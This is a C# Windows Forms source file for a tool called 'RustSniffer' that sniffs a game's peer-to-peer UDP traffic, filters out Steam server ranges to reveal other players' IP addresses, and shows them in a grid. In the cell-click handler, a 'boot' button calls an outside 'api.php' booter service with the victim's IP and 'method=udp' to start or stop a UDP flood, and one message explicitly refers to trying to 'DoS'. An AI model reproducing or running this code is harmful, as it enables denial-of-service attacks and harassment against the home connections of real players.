using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using SharpPcap;
using PacketDotNet;
using System.Collections;
using System.Management;

namespace RustSniffer {
    public partial class Form1 : Form {
        public Form1() {
            InitializeComponent();
        }

        private bool BackgroundThreadStop;
        private object QueueLock = new object();
        private List<RawCapture> PacketQueue = new List<RawCapture>();
        private System.Threading.Thread backgroundThread;
        ICaptureDevice sniffingAdapter = null;
        CaptureDeviceList devices = CaptureDeviceList.Instance;

        private void Form1_Load(object sender, EventArgs e) {
            if (!Global.authenticated) {
                MessageBox.Show("Stop trying to bypass my authentication.");
                Close();
            }
            if (devices.Count < 1) {
                MessageBox.Show("You have no network adapters on this machine.");
            } else {
                foreach (ICaptureDevice dev in devices) {
                    adapterList.Items.Add(dev.Description);
                }
                adapterList.SelectedIndex = 0;
            }

            updateGridview(this);

        }

        private void adapterList_SelectedIndexChanged(object sender, EventArgs e) {
            sniffingAdapter = devices[adapterList.SelectedIndex];
        }

        private void startButton_Click(object sender, EventArgs e) {
            StartCapture();
        }

        private void stopButton_Click(object sender, EventArgs e) {
            Shutdown();
        }

        private Queue<PacketWrapper> packetStrings;

        private int packetCount;
        //private BindingSource bs;

        void device_OnPacketArrival(object sender, CaptureEventArgs e) {
            // lock QueueLock to prevent multiple threads accessing PacketQueue at
            // the same time
            lock (QueueLock) {
                PacketQueue.Add(e.Packet);
            }
        }

        private void StartCapture() {
            sniffingAdapter = devices[adapterList.SelectedIndex];
            packetCount = 0;
            packetStrings = new Queue<PacketWrapper>();
            BackgroundThreadStop = false;
            backgroundThread = new System.Threading.Thread(BackgroundThread);
            backgroundThread.Start();
            arrivalEventHandler = new PacketArrivalEventHandler(device_OnPacketArrival);
            sniffingAdapter.OnPacketArrival += arrivalEventHandler;
            captureStoppedEventHandler = new CaptureStoppedEventHandler(device_OnCaptureStopped);
            sniffingAdapter.OnCaptureStopped += captureStoppedEventHandler;
            sniffingAdapter.Open();
            sniffingAdapter.Filter = "udp[8:4]==0x00010024 and not dst net 192.168.0.0/16 and not dst net 10.0.0.0/8 and not dst net 172.16.0.0/12 and not dst net 45.121.184.0/23 and not dst net 45.121.186.0/23 and not dst net 103.28.54.0/23 and not dst net 146.66.152.0/23 and not dst net 146.66.154.0/24 and not dst net 146.66.154.0/24 and not dst net 146.66.156.0/23 and not dst net 146.66.158.0/23 and not dst net 155.133.224.0/23 and not dst net 155.133.227.0/24 and not dst net 155.133.228.0/23 and not dst net 155.133.230.0/23 and not dst net 155.133.232.0/24 and not dst net 155.133.233.0/24 and not dst net 155.133.234.0/24 and not dst net 155.133.235.0/24 and not dst net 155.133.236.0/23 and not dst net 155.133.238.0/24 and not dst net 155.133.239.0/24 and not dst net 155.133.240.0/23 and not dst net 155.133.242.0/23 and not dst net 155.133.244.0/24 and not dst net 155.133.245.0/24 and not dst net 155.133.246.0/23 and not dst net 155.133.248.0/24 and not dst net 155.133.249.0/24 and not dst net 155.133.252.0/24 and not dst net 155.133.253.0/24 and not dst net 155.133.254.0/24 and not dst net 155.133.255.0/24 and not dst net 162.254.192.0/24 and not dst net 162.254.193.0/24 and not dst net 162.254.194.0/23 and not dst net 162.254.196.0/24 and not dst net 162.254.197.0/24 and not dst net 162.254.198.0/24 and not dst net 162.254.199.0/24 and not dst net 185.25.180.0/23 and not dst net 185.25.182.0/24 and not dst net 185.25.183.0/24 and not dst net 192.69.96.0/23 and not dst net 205.185.194.0/24 and not dst net 205.196.6.0/24 and not dst net 208.64.200.0/24 and not dst net 208.64.201.0/24 and not dst net 208.64.202.0/24 and not dst net 208.64.203.0/24 and not dst net 208.78.164.0/23 and not dst net 208.78.166.0/24 and not dst net 208.78.167.0/24";
            // Commented filter is missing a lot of Steam ranges
            //sniffingAdapter.Filter = "udp[8:4]==0x00010024 and not dst net 192.168.0.0/16 and not dst net 10.0.0.0/8 and not dst net 172.16.0.0/20 and not dst net 205.196.6.0/24 and not dst net 162.254.192.0/21 and not dst net 208.78.164.0/22 and not dst net 208.64.200.0/22 and not dst net 192.69.96.0/22";
            sniffingAdapter.StartCapture();
        }

        void device_OnCaptureStopped(object sender, CaptureStoppedEventStatus status) {
            if (status != CaptureStoppedEventStatus.CompletedWithoutError) {
                MessageBox.Show("Error stopping capture", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void BackgroundThread() {
            while (!BackgroundThreadStop) {
                bool shouldSleep = true;

                lock (QueueLock) {
                    if (PacketQueue.Count != 0) {
                        shouldSleep = false;
                    }
                }

                if (shouldSleep) {
                    System.Threading.Thread.Sleep(250);
                } else {
                    List<RawCapture> ourQueue;
                    lock (QueueLock) {
                        ourQueue = PacketQueue;
                        PacketQueue = new List<RawCapture>();
                    }

                    foreach (var packet in ourQueue) {
                        var packetWrapper = new PacketWrapper(packetCount, packet);
                        this.BeginInvoke(new MethodInvoker(delegate {
                            packetStrings.Enqueue(packetWrapper);
                        }
                        ));

                        packetCount++;
                        var currentPacket = PacketDotNet.Packet.ParsePacket(packet.LinkLayerType, packet.Data);
#pragma warning disable CS0618 // Type or member is obsolete
                        var ip = PacketDotNet.IpPacket.GetEncapsulated(currentPacket).DestinationAddress;
#pragma warning restore CS0618 // Type or member is obsolete
                        if (!Global.ipAddresses.Contains(ip) && !Global.whitelist.Contains(ip)) {
                            Global.ipAddresses.Add(ip);
                            Global.players.Add(new Player(ip.ToString(), dataGridView1, this));
                            updateGridview(this);
                            //break;
                        } else {
                            Player p = getPlayerByIP(ip.ToString());
                            if (p != null) {
                                p.timer.Stop();
                                p.timer.Start();
                            }
                        }
                    }
                }
            }
        }

        private Player getPlayerByIP(string ip) {
            foreach (Player p in Global.players) {
                if (p.ip == ip) {
                    return p;
                }
            }
            return null;
        }

        public void updateGridview(Form form) {
            if (form.InvokeRequired) {
                // We're on a thread other than the GUI thread
                form.Invoke(new MethodInvoker(() => updateGridview(form)));
                return;
            }

            // Do what you need to do to the form here
            dataGridView1.Rows.Clear();
            foreach (Player p in Global.players) {
                dataGridView1.Rows.Add(p.ip, p.loc, p.isp, p.bootStatus);
            }
        }

        private void dataGridView_CellClick(object sender, DataGridViewCellEventArgs e) {
            if (e.ColumnIndex == dataGridView1.Columns["bootButton"].Index) {
                if (Global.apiSettings) {
                    DataGridViewRow selectedRow = dataGridView1.Rows[e.RowIndex];
                    Player p = getPlayerByIP(selectedRow.Cells["ip"].Value.ToString());
                    if (p != null) {
                        if (p.bootStatus) { // If they're being booted
                            p.bootStatus = false; // Stop the boot
                            using (var objClient = new System.Net.WebClient()) {
                                var strFile = objClient.DownloadString("http://" + Global.apiServer + "/api.php?key=" + Global.apiKey + "&host=" + selectedRow.Cells["ip"].Value.ToString() + "&port=80&time=" + Global.apiTime + "&method=stop&threads=" + Global.apiThreads);
                                if (strFile.Contains("With: stop")) {
                                    p.bootStatus = false;
                                    updateGridview(this);
                                }
                            }
                        } else {
                            // Start the boot
                            using (var objClient = new System.Net.WebClient()) {
                                var strFile = objClient.DownloadString("http://" + Global.apiServer + "/api.php?key=" + Global.apiKey + "&host=" + selectedRow.Cells["ip"].Value.ToString() + "&port=80&time=" + Global.apiTime + "&method=udp&threads=" + Global.apiThreads);
                                if (strFile.Contains("With: udp")) {
                                    p.bootStatus = true;
                                    updateGridview(this);
                                }
                            }
                        }
                    }
                } else {
                    MessageBox.Show("Setup your API settings before trying to DoS.");
                }
                //Do something with your button.
            }
        }

        private PacketArrivalEventHandler arrivalEventHandler;
        private CaptureStoppedEventHandler captureStoppedEventHandler;

        private void Shutdown() {
            if (sniffingAdapter != null) {
                sniffingAdapter.StopCapture();
                sniffingAdapter.Close();
                sniffingAdapter.OnPacketArrival -= arrivalEventHandler;
                sniffingAdapter.OnCaptureStopped -= captureStoppedEventHandler;
                sniffingAdapter = null;


                if (backgroundThread != null) {
                    // ask the background thread to shut down
                    BackgroundThreadStop = true;

                    // wait for the background thread to terminate
                    backgroundThread.Join();
                }
            }
        }

        private void DoSAPIToolStripMenuItem_Click(object sender, EventArgs e) {
            Form DoSAPISettings = new APISettings();
            DoSAPISettings.Show();
        }

        private void exitToolStripMenuItem_Click(object sender, EventArgs e) {
            try {
                Shutdown();
            } catch {
                // NOTHING
            }
            Application.Exit();
        }

        private void whitelistToolStripMenuItem_Click(object sender, EventArgs e) {
            Form whitelistForm = new Whitelist();
            whitelistForm.Show();
        }

        private void clearButton_Click(object sender, EventArgs e) {
            Global.ipAddresses.Clear();
            Global.players.Clear();
            updateGridview(this);
        }

        private void autoPurgeToolStripMenuItem_Click(object sender, EventArgs e) {
            if (autoPurgeToolStripMenuItem.Checked == true) {
                autoPurgeToolStripMenuItem.Checked = false;
                Global.autoPurgeEnabled = false;
            } else {
                autoPurgeToolStripMenuItem.Checked = true;
                Global.autoPurgeEnabled = true;
            }
        }

    }

    public class PacketWrapper {
        public RawCapture p;

        public int Count { get; private set; }
        public PosixTimeval Timeval { get { return p.Timeval; } }
        public LinkLayers LinkLayerType { get { return p.LinkLayerType; } }
        public int Length { get { return p.Data.Length; } }

        public PacketWrapper(int count, RawCapture p) {
            this.Count = count;
            this.p = p;
        }
    }
}
